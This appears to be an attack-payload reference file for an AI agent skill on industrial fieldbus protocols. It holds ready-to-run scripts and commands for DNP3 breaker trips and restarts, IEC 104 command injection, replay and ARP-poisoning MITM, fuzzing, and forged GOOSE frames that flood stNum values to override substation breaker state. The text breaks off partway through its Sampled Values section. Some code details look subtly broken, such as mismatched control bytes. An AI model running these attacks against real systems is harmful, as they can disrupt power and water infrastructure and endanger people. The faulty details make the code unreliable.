# Payloads: ICS Fieldbus Protocol Attack

> This file is a companion to `SKILL.md`, containing protocol-specific attack payloads, command references, packet crafting examples, and fuzzing templates for industrial fieldbus protocols BEYOND Modbus TCP. All content is for authorized security assessment in lab environments only.

---

## Table of Contents

1. [DNP3 (Distributed Network Protocol)](#1-dnp3)
2. [IEC 60870-5-101 (Serial)](#2-iec-60870-5-101)
3. [IEC 60870-5-104 (TCP)](#3-iec-60870-5-104)
4. [IEC 61850 GOOSE](#4-iec-61850-goose)
5. [IEC 61850 Sampled Values (SV)](#5-iec-61850-sampled-values)
6. [IEC 61850 MMS](#6-iec-61850-mms)
7. [PROFINET (RT/IRT)](#7-profinet)
8. [Profibus DP/PA (Serial)](#8-profibus-dppa)
9. [EtherCAT](#9-ethercat)
10. [Foundation Fieldbus H1/HSE](#10-foundation-fieldbus)
11. [HART and WirelessHART](#11-hart)
12. [BACnet Deep Dive](#12-bacnet)
13. [CC-Link and CC-Link IE](#13-cc-link)
14. [Modbus RTU and Modbus Plus](#14-modbus-serial)
15. [EtherNet/IP CIP Deep](#15-ethernetip-cip)
16. [ICCP / TASE.2](#16-iccp-tase2)
17. [Cross-Protocol MITM with Ettercap/Bettercap](#17-mitm)
18. [Boofuzz Templates](#18-boofuzz)
19. [Wireshark Display Filters](#19-wireshark)
20. [Scapy Layer Reference](#20-scapy)
21. [OpenPLC Web HMI + Modbus TCP 实战发现 (v0.2.5.1)](#21-openplc-实战发现)

---

## 1. DNP3

DNP3 (Distributed Network Protocol version 3) is the dominant SCADA protocol in the North American power utility and water/wastewater sectors. It runs on TCP/UDP port 20000 and uses a three-layer architecture (Data Link, Transport, Application). DNP3 Secure Authentication (SAv2 through SAv5) is optional and frequently disabled.

### 1.1 DNP3 Reconnaissance

```bash
# Discover DNP3 servers via nmap NSE
nmap -p 20000 --script dnp3-info 192.168.1.0/24

# Detailed DNP3 info with version probing
nmap -p 20000 --script dnp3-info --script-args dnp3-info.timeout=5s,newtimeout=10s 192.168.1.10

# Masscan for fast DNP3 discovery (lab only)
masscan 192.168.1.0/24 -p20000 --rate=500 -oL dnp3_hosts.txt

# Banner-style DNP3 link layer ping (using Scapy)
python3 -c "
from scapy.contrib.dnp3 import DNP3, DNP3LinkLayer, DNP3Request
from scapy.all import IP, TCP, send
pkt = IP(dst='192.168.1.10')/TCP(dport=20000, flags='S')
# Handshake omitted for brevity; use real TCP socket in production
send(pkt)
"
```

### 1.2 DNP3 Active Enumeration

```bash
# OpenDNP3 master - connect and perform link status
master -c master.config --link-status

# OpenDNP3 - read all analog inputs (Class 0)
master -c master.config --read class-0

# Read binary inputs (breaker status)
master -c master.config --read binary-input 0-100

# Read device attributes (FC 0, Class 0)
master -c master.config --get-device-attr 0

# Read specific variation (e.g., analog input double-precision float)
master -c master.config --read analog-input variation=5

# Clear dirty diagnostics (FC 13 - useful to determine if device is logging events)
master -c master.config --clear-diagnostics
```

### 1.3 DNP3 Master Configuration Example

OpenDNP3 uses INI-style configuration. Below is a minimal lab config.

```ini
# master.config - OpenDNP3 master lab config
[master]
loglevel = INFO
tcpclient = 127.0.0.1:20000
localaddr = 1
remoteaddr = 10
concurrency = 5
unsolclass = 0,1,2,3

[stack]
mastertime = false
# Reference ICS-CERT advisories before enabling in production testing
logfilters = -ALL,interface=INFO
```

```ini
# outstation.config - OpenDNP3 outstation lab config
[outstation]
loglevel = INFO
tcpserver = 0.0.0.0:20000
localaddr = 10
remoteaddr = 1
outstationid = LAB-DNP3-001

[database]
# Define binary/analog points for testing
sizes = bi:100,bo:10,ai:50,ao:10,counter:10

[secauth]
# Disabled = SAv0 (vulnerable to command injection)
# enabled = SAv5 (challenge-response with AES-128-GCM)
enabled = false
```

### 1.4 DNP3 Direct Operate (Command Execution)

```bash
# Operate binary output index 1 (e.g., breaker trip)
master -c master.config --command binary-output 1:1 --function direct-operate

# Operate analog output (setpoint) index 3 to 75.5
master -c master.config --command analog-output 3:75.5 --function direct-operate

# Operate with time-on/time-off (for pulse commands)
master -c master.config --command binary-output-time 5:1,60 --function select-before-operate

# Select-then-Operate (forces SBO sequence even when Direct is supported)
master -c master.config --command binary-output 1:1 --function select
master -c master.config --command binary-output 1:1 --function operate

# Cold/Warm restart (FC 13 - causes outstation to reboot)
master -c master.config --restart cold
```

### 1.5 DNP3 Packet Crafting with Scapy

```python
#!/usr/bin/env python3
# dnp3_read.py - Craft and send DNP3 Read request via Scapy
from scapy.all import IP, TCP, send, sr1, conf
from scapy.contrib.dnp3 import (
    DNP3, DNP3LinkLayer, DNP3Transport, DNP3ApplicationRequest,
    DNP3ReadRequest, DNP3ObjectHeader
)
import socket, struct

def send_dnp3_read(target_ip, target_port, source, dest, index, count):
    """Send a DNP3 Class 0 read request."""
    # Establish TCP connection manually (DNP3 requires TCP setup)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target_ip, target_port))

    # Build the DNP3 packet
    pkt = (
        DNP3LinkLayer(start=0x0564, length=5, ctrl=0x44, dest=dest, source=source) /
        DNP3Transport(th=0x00) /
        DNP3ApplicationRequest(ac=0x01, fc=0x01) /
        DNP3ObjectHeader(type=0x00, qual=0x06, start=index, stop=index+count)
    )

    # Wire format: 0x0564 + length + ctrl + dest + source + crc + ...
    raw_bytes = bytes(pkt)
    # Scapy's DNP3 layer handles CRCs; verify with .show()
    pkt.show()
    print(f"Sending {len(raw_bytes)} bytes")

    s.send(raw_bytes)
    response = s.recv(4096)
    print(f"Response: {response.hex()}")
    s.close()

if __name__ == "__main__":
    send_dnp3_read("192.168.1.10", 20000, source=1, dest=10, index=0, count=10)
```

### 1.6 DNP3 Replay Attack

```bash
# Capture DNP3 traffic
tcpdump -i eth0 -w dnp3_capture.pcap port 20000

# Analyze captured traffic
tshark -r dnp3_capture.pcap -Y dnp3 -V

# Extract specific Direct Operate commands
tshark -r dnp3_capture.pcap -Y "dnp3.app.funcCode == 5" -T fields \
  -e frame.time_relative -e ip.src -e ip.dst -e dnp3.app.outIndex \
  -e dnp3.app.outValue

# Replay captured DNP3 packets (modify timestamps)
tcpreplay --intf1=eth0 --loop=10 --pktlen dnp3_capture.pcap

# Replay with tcprewrite to change destination
tcprewrite --infile=dnp3_capture.pcap --outfile=dnp3_modified.pcap \
  --dstipmap=0.0.0.0/0:192.168.1.20
tcpreplay --intf1=eth0 dnp3_modified.pcap
```

### 1.7 DNP3 MITM with Bettercap

```bash
# ARP poison DNP3 master/outstation pair
sudo bettercap -iface eth0

# Within bettercap:
set arp.spoof.targets 192.168.1.5 192.168.1.10
set arp.spoof.internal false
arp.spoof on

# Capture DNP3 in transit
set net.sniff.filter "tcp port 20000"
net.sniff on

# Custom DNP3 filter to mutate function codes
set dnp3.mutate.fcodes "5,6"  # Mutate Direct Operate and Direct Operate No Ack
dnp3.mutate on
```

### 1.8 DNP3 MITM Custom Filter (Ettercap)

```ettercap
# dnp3_filter.ef - Ettercap filter to log DNP3 Direct Operate commands
if (ip.proto == TCP && tcp.dst == 20000) {
    # Look for DNP3 link layer start (0x0564)
    if (search(DATA.data, "\x05\x64")) {
        # Extract function code (byte 10 from DNP3 start)
        # If function code is 5 (Direct Operate), log
        log(DATA.data, "/tmp/dnp3_operate.log");
        msg("[DNP3] Direct Operate detected!\n");
    }
}
```

```bash
# Compile and apply the filter
etterfilter -o dnp3_filter.ef dnp3_filter.txt
sudo ettercap -T -M arp -F dnp3_filter.ef /192.168.1.5// /192.168.1.10//
```

### 1.9 DNP3 Fuzzing Template (Boofuzz)

```python
#!/usr/bin/env python3
# fuzz_dnp3.py - Boofuzz template for DNP3
from boofuzz import *

def main():
    session = Session(target=Target(connection=TCPSocketConnection("192.168.1.10", 20000)))

    s_initialize("dnp3_link_request")
    # DNP3 link layer start bytes (always 0x0564)
    s_static("\x05\x64")
    # Length (5-255)
    s_byte(0x05, name="length", fuzz_values=[0x00, 0xFF, 0x05, 0x06, 0xFE])
    # Control byte
    s_byte(0x44, name="ctrl", fuzz_values=[0x00, 0x40, 0x44, 0xC4, 0xFF])
    # Destination address
    s_word(0x000A, endian=">", name="dest", fuzz_values=[0x0000, 0xFFFF, 0x000A])
    # Source address
    s_word(0x0001, endian=">", name="source", fuzz_values=[0x0000, 0xFFFF, 0x0001])
    # CRC16 - boofuzz will mutate this too; devices may respond to bad CRCs
    s_word(0x0000, endian=">", name="crc_link", fuzz_values=[0x0000, 0xFFFF])

    # Transport layer
    s_byte(0x00, name="transport", fuzz_values=[0x00, 0x80, 0xFF])

    # Application layer
    s_byte(0xC1, name="app_control", fuzz_values=[0x00, 0xC1, 0xFF])
    s_byte(0x01, name="func_code", fuzz_values=range(0, 24))
    # Object header
    s_byte(0x00, name="obj_type", fuzz_values=range(0, 256))
    s_byte(0x06, name="qualifier", fuzz_values=range(0, 256))
    s_word(0x0000, endian=">", name="start_idx", fuzz_values=[0, 100, 0xFFFF])

    session.connect(s_get("dnp3_link_request"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

### 1.10 DNP3 SAv5 Downgrade

```python
#!/usr/bin/env python3
# dnp3_sav_downgrade.py - Test for SAv downgrade vulnerability
# DNP3 SAv5 challenge-response uses AES-128-GCM. If the master
# supports SAv0 (no auth) and SAv5 simultaneously, an attacker can
# strip the challenge request to force SAv0.
from scapy.all import IP, TCP
from scapy.contrib.dnp3 import DNP3, DNP3LinkLayer
import socket, sys

def attempt_sav_downgrade(target, port, source=1, dest=10):
    """Attempt to issue command without SAv challenge."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, port))

    # Build a Direct Operate (FC 5) request WITHOUT SAv wrapper
    # If SAv5 is enforced, expect "auth required" exception (0x09)
    # If SAv0 is allowed, expect "ack" + state change
    sav0_pkt = bytes.fromhex(
        "0564"      # start
        "05"        # length
        "44"        # ctrl (DIR=1, PRM=1, FCB=0, FCV=0, FC=4 reset remote)
        "0A00"      # dest = 10
        "0100"      # source = 1
        "B5C5"      # CRC (calculated)
        "00"        # transport
        "C1"        # app control
        "05"        # FC 5 = Direct Operate
        "0C010600000000000000"  # Binary Output object header
    )

    s.send(sav0_pkt)
    try:
        response = s.recv(4096)
        print(f"Response (hex): {response.hex()}")
        if len(response) > 10 and response[10] == 0x09:
            print("[+] SAv enforced (exception 0x09)")
            return False
        elif len(response) > 10 and response[10] == 0x00:
            print("[!] SAv NOT enforced - direct operate succeeded!")
            return True
    except socket.timeout:
        print("[-] Timeout")
    finally:
        s.close()

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.10"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 20000
    attempt_sav_downgrade(target, port)
```

### 1.11 DNP3 Known CVEs (Reference)

The following DNP3-related CVEs document publicly disclosed vulnerabilities. Test only in lab.

- **CVE-2017-5165** — Triangle MicroWorks DNP3 stack buffer overflow
- **CVE-2017-6023** — Schweitzer Engineering Laboratories (SEL) DNP3 implementation DoS
- **CVE-2013-2778** — Multiple vendor DNP3 implementations; cause panic via malformed packet
- **CVE-2017-14044** — Triangle MicroWorks DNP3 Outstation TCP/IP parser use-after-free
- **CVE-2017-14045** — Triangle MicroWorks DNP3 master parser infinite loop

```bash
# Verify target firmware against known CVEs
nmap -p 20000 --script dnp3-info 192.168.1.10 | grep -i "firmware"
# Cross-reference output against NVD: https://nvd.nist.gov/vuln/search/results?query=DNP3
```

---

## 2. IEC 60870-5-101

IEC 60870-5-101 is the serial precursor to IEC 104. It runs over RS-232, RS-485, or via terminal servers. Many remote terminal units (RTUs) still expose -101 over serial-to-TCP bridges.

### 2.1 IEC 101 Reconnaissance

```bash
# Detect IEC 101 over TCP via terminal server
nmap -p 502,20000,2404,4001-4010 -sV 192.168.1.10

# Identify IEC 101 by sending fixed-length 0x68 framing
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.10', 4001))
# Short frame: START=0x68, LEN=4, C=0x07, A=0x00, CS, END=0x68
# This is a reset remote link request
short_frame = bytes.fromhex('68040700A416')
s.send(short_frame)
print(s.recv(1024).hex())
"
```

### 2.2 IEC 101 Link Layer Commands

```python
#!/usr/bin/env python3
# iec101_link_test.py - Test IEC 60870-5-101 link layer commands
import socket, struct

def crc_cs(data):
    """Compute checksum (sum of bytes mod 256)."""
    return sum(data) & 0xFF

def short_frame(c, a):
    """Build IEC 101 short frame."""
    cs = crc_cs([c, a])
    return bytes([0x10, c, a, cs, 0x16])

def long_frame(data, c, a):
    """Build IEC 101 long frame."""
    cs = crc_cs(data + [c, a])
    return bytes([0x68, len(data)] + data + [c, a, cs, 0x16])

# Reset remote link (C = 0x40 + 0x07 = 0x47)
print("Reset remote link:", short_frame(0x40, 0x00).hex())

# Reset process link (C = 0x40 + 0x00 = 0x40)
print("Reset process link:", short_frame(0x40, 0x00).hex())

# Request link status
print("Link status:", short_frame(0x49, 0x00).hex())

# Request user data class 1
print("Class 1 request:", short_frame(0x4B, 0x00).hex())

# Request user data class 2
print("Class 2 request:", short_frame(0x5B, 0x00).hex())
```

### 2.3 IEC 101 Application Layer ASDUs

```python
#!/usr/bin/env python3
# iec101_asdu_examples.py - IEC 60870-5-101 ASDU reference
# Common ASDU types in IEC 101/104

ASDU_TYPES = {
    # Single point information
    1: "M_SP_NA_1 - Single-point information",
    3: "M_DP_NA_1 - Double-point information",
    5: "M_ST_NA_1 - Step position information",
    7: "M_BO_NA_1 - Bitstring of 32 bits",
    9: "M_ME_NA_1 - Measured value, normalized",
    11: "M_ME_NB_1 - Measured value, scaled",
    13: "M_ME_NC_1 - Measured value, short floating point",
    15: "M_IT_NA_1 - Integrated totals",

    # Double point (breaker status: 1=intermediate, 2=off, 3=on, 4=bad)
    31: "M_DP_TB_1 - Double-point with time CP56Time2a",

    # Commands
    45: "C_SC_NA_1 - Single-point command",
    46: "C_DC_NA_1 - Double-point command",
    47: "C_RC_NA_1 - Regulating step command",
    48: "C_SE_NA_1 - Set-point command, normalized",
    49: "C_SE_NB_1 - Set-point command, scaled",
    50: "C_SE_NC_1 - Set-point command, short floating point",

    # System commands
    100: "C_IC_NA_1 - Interrogation command",
    101: "C_CI_NA_1 - Counter interrogation command",
    102: "C_RD_NA_1 - Read command",
    103: "C_CS_NA_1 - Clock synchronization command",
    104: "C_TS_NA_1 - Test command",
    105: "C_RP_NA_1 - Reset process command",
    107: "C_TS_TA_1 - Test command with time CP56Time2a",

    # Parameter in actuated device
    110: "C_ME_NA_1 - Measured value parameter, normalized",
    111: "C_ME_NB_1 - Measured value parameter, scaled",
    112: "C_ME_NC_1 - Measured value parameter, short float",
    113: "P_AC_NA_1 - Parameter activation",
}

def build_asdu(type_id, cause, common_addr, io_addr, value, sco_qual=0x00):
    """Build minimal IEC 101 ASDU for command (type 45)."""
    # ASDU: type, cOT struct, IOA
    # Variable structure qualifier: number of objects (1) + SQ=0
    asdu = [
        type_id,                  # Type ID
        0x01,                     # Number of objects = 1
        (cause & 0xFF),           # Cause of transmission low byte
        ((cause >> 8) & 0xFF),    # Cause high byte (P/N bit + originator)
        (common_addr & 0xFF),     # Common address low
        ((common_addr >> 8) & 0xFF),
    ]
    # IOA: 3 bytes little-endian
    asdu.extend([(io_addr & 0xFF), ((io_addr >> 8) & 0xFF), ((io_addr >> 16) & 0xFF)])
    # Value + SCO (single command: qu + S/E)
    asdu.append(value & 0xFF)
    if type_id == 45:
        asdu[-1] = (value & 0x01) | (sco_qual & 0xFE)
    return bytes(asdu)

# Single command (breaker close)
cmd = build_asdu(45, 6, 1, 100, value=1, sco_qual=0x00)  # S/E = 0 = execute
print(f"Single command: {cmd.hex()}")

# Interrogation command (ASDU type 100)
interrogation = build_asdu(100, 6, 1, 0, value=0x14)  # group 20 interrogation
print(f"Interrogation: {interrogation.hex()}")
```

### 2.4 IEC 101 Over Terminal Server

```bash
# Connect serial-over-TCP and send IEC 101 frames
socat - TCP:192.168.1.10:4001
# Type frame bytes in hex via socat requires xxd conversion:
echo "100700414716" | xxd -r -p | socat - TCP:192.168.1.10:4001

# Or use a Python client to send IEC 101 over TCP
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.10', 4001))
# Reset remote link
s.send(bytes.fromhex('100700414716'))
print('Response:', s.recv(1024).hex())
s.close()
"
```

---

## 3. IEC 60870-5-104

IEC 60870-5-104 is the TCP/IP version of IEC 101, used in modern power utility SCADA. It runs on port 2404 and uses the same ASDU format as IEC 101 but with TCP transport.

### 3.1 IEC 104 Reconnaissance

```bash
# Discover IEC 104 servers
nmap -p 2404 -sV 192.168.1.0/24

# Identify IEC 104 via nmap NSE (custom)
nmap -p 2404 --script iec-identify 192.168.1.10

# Banner grab by sending STARTDT act con
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.10', 2404))
# STARTDT act: APCI (6 bytes) + empty ASDU
# Start byte 0x68, len 4, type 0x07 (STARTDT act)
s.send(bytes.fromhex('680407000000'))
print('STARTDT con:', s.recv(1024).hex())
# Now send interrogation
# APCI: 0x68, len 0x0E, type 0x01 (I frame), send 0x00, recv 0x00
# ASDU: type 100, struct 1, cause 6, orig 0, ca 1
s.send(bytes.fromhex('680E01000064010600010000000014'))
print('Interrogation response:', s.recv(8192).hex())
s.close()
"
```

### 3.2 lib60870 Client Examples

```bash
# Build lib60870 from source
git clone https://github.com/mz-automation/lib60870.git
cd lib60870 && mkdir build && cd build
cmake -DBUILD_EXAMPLES=ON ..
make -j$(nproc)

# Run IEC 104 server (for lab testing)
./examples/iec104/server/tutorial03

# Run IEC 104 client to query lab server
./examples/iec104/client/client_example 127.0.0.1 2404

# Test client with interrogation
./examples/iec104/client/client_example --interrogation 127.0.0.1 2404

# Test client with command
./examples/iec104/client/client_example --command 127.0.0.1 2404 single 100 1
```

### 3.3 IEC 104 Command Injection (ASDU Type 45)

```python
#!/usr/bin/env python3
# iec104_command_inject.py - Send single command to IEC 104 RTU
import socket, struct, sys

def build_apci(send_seq, recv_seq, payload=b''):
    """Build I-frame APCI."""
    # I-frame: 0x68, len, send_seq*2, recv_seq*2, ...
    header = b'\x68' + bytes([2 + 4 + len(payload)]) + \
        struct.pack('<H', send_seq*2) + struct.pack('<H', recv_seq*2)
    return header + payload

def build_single_command(common_addr=1, io_addr=100, se=False, qu=0):
    """Build ASDU type 45 (single command)."""
    type_id = 45
    num_obj = 1
    cause_tx = 6  # activation
    org = 0
    ca = common_addr & 0xFFFF
    ioa = io_addr & 0xFFFFFF
    # SCS = single command state (0 or 1)
    # SCO = qu (4 bits) + S/E (1 bit) + 0 (3 bits)
    sco = (qu << 2) | (1 if se else 0)
    asdu = bytes([
        type_id,
        num_obj,
        cause_tx & 0xFF,
        ((cause_tx >> 8) & 0x7F) | ((org & 0xFF) << 7),
        ca & 0xFF,
        (ca >> 8) & 0xFF,
        ioa & 0xFF,
        (ioa >> 8) & 0xFF,
        (ioa >> 16) & 0xFF,
        sco & 0x01,  # SCS = breaker state (0 or 1)
        sco,         # SCO with qualifier
    ])
    return asdu

def send_iec104_command(target, port, common_addr, io_addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, port))

    # Step 1: STARTDT act
    s.send(bytes.fromhex('680407000000'))
    response = s.recv(1024)
    print(f"STARTDT con: {response.hex()}")

    # Step 2: Send single command (execute)
    cmd = build_single_command(common_addr, io_addr, se=False, qu=0)
    apci = build_apci(send_seq=1, recv_seq=0, payload=cmd)
    print(f"Sending single command: {apci.hex()}")
    s.send(apci)
    response = s.recv(1024)
    print(f"Response: {response.hex()}")
    s.close()

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.10"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2404
    send_iec104_command(target, port, common_addr=1, io_addr=100)
```

### 3.4 IEC 104 Replay

```bash
# Capture IEC 104 traffic for replay
sudo tcpdump -i eth0 -w iec104.pcap port 2404

# Replay specific commands
tcpreplay --intf1=eth0 iec104.pcap

# Use tcprewrite to retarget replayed traffic
tcprewrite --infile=iec104.pcap --outfile=iec104_target2.pcap \
  --dstipmap=0.0.0.0/0:192.168.1.20 \
  --srcipmap=0.0.0.0/0:192.168.1.5
tcpreplay --intf1=eth0 iec104_target2.pcap
```

### 3.5 IEC 104 Sniffing

```bash
# Live capture with Wireshark
wireshark -ki eth0 -f "port 2404" &

# tshark with ASDU-level decode
tshark -i eth0 -Y iec60870_104 -V -O iec60870_asdu

# Extract single command (type 45) events
tshark -i eth0 -Y "iec60870_asdu.typeid == 45" -T fields \
  -e frame.time -e ip.src -e ip.dst \
  -e iec60870_asdu.causetx -e iec60870_asdu.ioa

# Continuous capture to file
tshark -i eth0 -w iec104_$(date +%Y%m%d_%H%M).pcap -f "port 2404"
```

### 3.6 IEC104Attack Tool (Corelight)

```bash
# Clone the IEC104Attack framework
git clone https://github.com/ITI/ICS-EXERCISES.git
cd ICS-EXERCISES/iec104attack

# Run replay attack
python3 iec104attack.py --target 192.168.1.10:2404 --mode replay --pcap capture.pcap

# Run fuzz attack
python3 iec104attack.py --target 192.168.1.10:2404 --mode fuzz --count 1000

# Run command scan (enumerate ASDU types)
python3 iec104attack.py --target 192.168.1.10:2404 --mode enumerate
```

### 3.7 IEC 104 Boofuzz Template

```python
#!/usr/bin/env python3
# fuzz_iec104.py - Boofuzz template for IEC 60870-5-104
from boofuzz import *

def main():
    session = Session(target=Target(connection=TCPSocketConnection("192.168.1.10", 2404)))

    # First send STARTDT act (handshake)
    s_initialize("startdt")
    s_static("\x68\x04\x07\x00\x00\x00")

    # Then fuzz an I-frame with command ASDU
    s_initialize("i_frame")
    # APCI
    s_static("\x68")  # start byte
    s_byte(0x0E, name="len")  # length
    s_word(0x0002, endian="<", name="send_seq")  # send seq
    s_word(0x0000, endian="<", name="recv_seq")  # recv seq
    # ASDU
    s_byte(45, name="type_id", fuzz_values=[0, 45, 46, 47, 100, 127, 255])
    s_byte(0x01, name="num_obj")
    s_byte(0x06, name="cause_low")
    s_byte(0x00, name="cause_high")
    s_word(0x0001, endian="<", name="common_addr")
    s_word(0x0064, endian="<", name="ioa_low")
    s_byte(0x00, name="ioa_high")
    s_byte(0x01, name="scs")
    s_byte(0x00, name="sco", fuzz_values=range(0, 256))

    session.connect(s_get("startdt"))
    session.connect(s_get("startdt"), s_get("i_frame"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

---

## 4. IEC 61850 GOOSE

GOOSE (Generic Object Oriented Substation Event) is a Layer 2 multicast protocol used for fast horizontal communication between IEDs in substations. It uses Ethertype 0x88B8 and operates at <4ms transfer time. GOOSE has no built-in authentication or encryption.

### 4.1 GOOSE Reconnaissance

```bash
# Capture GOOSE traffic
sudo tcpdump -i eth0 -w goose_capture.pcap ether proto 0x88b8

# Wireshark GOOSE dissector
wireshark -r goose_capture.pcap -Y iecgoose &

# tshark extract GOOSE source MAC and dataset
tshark -r goose_capture.pcap -Y iecgoose -T fields \
  -e eth.src -e _ws.col.Info -e goose.appid -e goose.goIDref

# Identify GOOSE publishers
tshark -i eth0 -Y iecgoose -T fields -e eth.src 2>/dev/null | sort -u

# Extract dataset references
tshark -r goose_capture.pcap -Y iecgoose -T fields \
  -e goose.goIDref -e goose.datasetRef | sort -u
```

### 4.2 GOOSE Frame Structure

```
Ethernet Header:
  - Destination MAC: multicast 01-0C-CD-01-XX-XX
  - Source MAC: IED MAC
  - EtherType: 0x88B8

GOOSE PDU:
  - APPID (2 bytes)
  - Length (2 bytes)
  - Reserved1 (2 bytes)
  - Reserved2 (2 bytes)
  - PDU (ASN.1 BER encoded):
    - gocbRef (visible string)
    - timeAllowedToLive (uint)
    - datSet (visible string)
    - goID (visible string)
    - t (UTC time)
    - stNum (uint)
    - sqNum (uint)
    - simulation (boolean)
    - confRev (uint)
    - ndsCom (boolean)
    - numDatSetEntries (uint)
    - allDatSetEntries (sequence of data)
```

### 4.3 GOOSE Injection with Scapy

```python
#!/usr/bin/env python3
# inject_goose.py - Forge and inject GOOSE frames
# WARNING: Layer-2 injection on production substations can cause
# protection relay maloperation and breaker trips. Lab only.
from scapy.all import Ether, Raw, sendp, conf
import struct, time

def build_goose_frame(src_mac, appid, gocb_ref, dataset_ref, go_id, stnum, sqnum, data_bytes):
    """Build a GOOSE frame for injection."""
    # GOOSE multicast MAC: 01-0C-CD-01-XX-XX where XX = appid-specific
    dst_mac = "01:0C:CD:01:00:01"

    # Build GOOSE PDU (simplified ASN.1 BER)
    def ber_visible_string(s):
        b = s.encode() if isinstance(s, str) else s
        return b'\x9a' + bytes([len(b)]) + b

    def ber_uint(tag, val):
        if val < 0x80:
            return bytes([tag, 0x01, val])
        elif val < 0x8000:
            return bytes([tag, 0x02, (val >> 8) & 0xFF, val & 0xFF])
        elif val < 0x800000:
            return bytes([tag, 0x03, (val >> 16) & 0xFF, (val >> 8) & 0xFF, val & 0xFF])
        else:
            return bytes([tag, 0x04, (val >> 24) & 0xFF, (val >> 16) & 0xFF,
                          (val >> 8) & 0xFF, val & 0xFF])

    def ber_utc_time(t):
        # 4 bytes seconds + 3 bytes fraction + 1 byte quality
        secs = int(t)
        return b'\x9c\x07' + struct.pack('>I', secs)[:4] + b'\x00\x00\x00\x00'

    def ber_bool(val):
        return b'\x83\x01' + (b'\x01' if val else b'\x00')

    # ASN.1 SEQUENCE
    contents = (
        b'\x80' + struct.pack('>H', appid) +  # APPID
        b'\x81' + struct.pack('>H', 8 + 50) + # length placeholder
        b'\x00\x00\x00\x00\x00\x00\x00\x00' + # reserved
        # PDU
        b'\x61' + b'\x82' +  # SEQUENCE tag with placeholder
        struct.pack('>H', 200) +  # length placeholder
        ber_visible_string(gocb_ref) +
        ber_uint(0x81, 1000) +  # timeAllowedToLive
        ber_visible_string(dataset_ref) +
        ber_visible_string(go_id) +
        ber_utc_time(time.time()) +
        ber_uint(0x85, stnum) +
        ber_uint(0x86, sqnum) +
        ber_bool(False) +  # simulation
        ber_uint(0x88, 1) +  # confRev
        ber_bool(False) +  # ndsCom
        ber_uint(0x8a, 1) +  # numDatSetEntries
        data_bytes  # allDatSetEntries
    )

    eth = Ether(src=src_mac, dst=dst_mac, type=0x88B8) / Raw(load=contents)
    return eth

if __name__ == "__main__":
    # Inject a GOOSE frame claiming breaker closed (data = 0x01)
    # When actual state is open (0x00)
    src = "00:11:22:33:44:55"  # Spoofed to match legitimate IED
    appid = 0x0001
    frame = build_goose_frame(
        src_mac=src,
        appid=appid,
        gocb_ref="LD0/LLN0$GO$gocb1",
        dataset_ref="LD0/LLN0$dataset1",
        go_id="LD0/LLN0",
        stnum=99999,  # Higher than any legitimate stNum
        sqnum=0,
        data_bytes=b'\xab\x02\x01\x01'  # BOOLEAN TRUE
    )
    frame.show()
    # Lab: loop inject every 1ms to maintain state override
    sendp(frame, iface="eth0", loop=1, inter=0.001)
```

### 4.4 GOOSE stNum Manipulation

```python
#!/usr/bin/env python3
# goose_stnum_attack.py - Cycle through stNum values to disrupt IEDs
from scapy.all import sendp, Ether, Raw
import time, sys

def inject_goose(stnum):
    """Inject a GOOSE frame with a specific stNum."""
    # Simplified frame for demonstration
    frame = (
        Ether(src="00:11:22:33:44:55", dst="01:0C:CD:01:00:01", type=0x88B8) /
        Raw(load=bytes.fromhex(
            f"0001 0026 0000 0000"
            f"61 82 001E"
            f"80 0C 4C44302F4C4C4E30247472697031"  # gocbRef = LD0/LLN0$trip1
            f"81 02 03E8"                            # timeAllowedToLive = 1000ms
            f"82 0E 4C44302F4C4C4E302464617461736574"  # datSet
            f"83 09 4C44302F4C4C4E30"               # goID
            f"84 07 {int(time.time()) & 0xFFFFFFFF:08x} 000000"  # t
            f"85 04 {stnum & 0xFF:02x} {(stnum >> 8) & 0xFF:02x} {(stnum >> 16) & 0xFF:02x} {(stnum >> 24) & 0xFF:02x}"
            f"86 01 00"                             # sqNum = 0
            f"ab 02 01 01"                           # BOOLEAN TRUE (breaker tripped)
        ))
    )
    sendp(frame, iface="eth0", verbose=0)

if __name__ == "__main__":
    print("[*] Starting GOOSE stNum attack...")
    # Inject with ever-incrementing stNum to keep subscribers receiving us as latest
    for stnum in range(1, 1000000):
        inject_goose(stnum)
        time.sleep(0.001)  # 1ms interval - matches typical GOOSE retransmit
        if stnum % 1000 == 0:
            print(f"[*] stNum = {stnum}")
```

### 4.5 GOOSE Sniffing and Analysis

```bash
# Capture GOOSE for 60 seconds and extract stNum progression
sudo tshark -i eth0 -Y iecgoose -a duration:60 -T fields \
  -e eth.src -e goose.stNum -e goose.sqNum | sort | uniq -c | sort -rn | head

# Identify anomalous stNum jumps (legitimate stNum increments by 1 per state change)
sudo tshark -i eth0 -Y iecgoose -T fields \
  -e frame.time_relative -e eth.src -e goose.stNum | \
  awk -F'\t' '{key=$2; seq[key]=seq[key]" "$3"} END {for (k in seq) print k": "seq[k]}' | \
  awk '{print}'

# Detect GOOSE sources by MAC
sudo tshark -i eth0 -Y iecgoose -T fields -e eth.src | sort | uniq -c

# Detect malformed GOOSE (truncated, missing fields)
sudo tshark -i eth0 -Y "iecgoose && _ws.expert.severity == Warn" -V
```

---

## 5. IEC 61850 Sampled Values

Sampled Values (SV) carry digitized current/voltage samples from Merging Units to IEDs. SV uses Ethertype 0x88BA and requires IEEE 1588 PTP time synchronization.

### 5.1 SV Reconnaissance

```bash
# Capture SV traffic
sudo tcpdump -i eth0 -w sv_capture.pcap ether proto 0x88ba

# Identify SV streams
tshark -r sv_capture.pcap -Y iecsv -T fields \
  -e eth.src -e eth.dst -e sv.svID -e sv.confRef | sort -u

# Count SV rate per stream
